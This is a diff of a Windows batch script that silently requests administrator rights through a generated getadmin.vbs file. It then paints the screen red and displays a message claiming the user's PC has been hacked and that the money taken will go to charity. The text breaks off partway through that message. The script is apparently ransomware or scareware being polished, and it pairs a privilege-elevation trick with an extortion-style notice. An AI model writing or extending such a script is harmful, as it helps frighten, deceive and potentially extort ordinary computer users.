@@ -1,13 +1,13 @@
-COLOR 4F
-
-:: give admin
 
 set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 
+COLOR 4F
+
+cls
 @echo off
-echo █!!!WARNING!!!█
-echo █████████████████████████████████████████████████████████████████████████████████████████████████████
+echo ^█!!!WARNING!!!^█
+echo ^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█^█
 echo Hello user, 
 echo Like we said we have hacked your PC, we are doing this NOT FOR US but for people in need.
 echo All of the money that we get will go to charity, We are not bad people, we want people to live a better
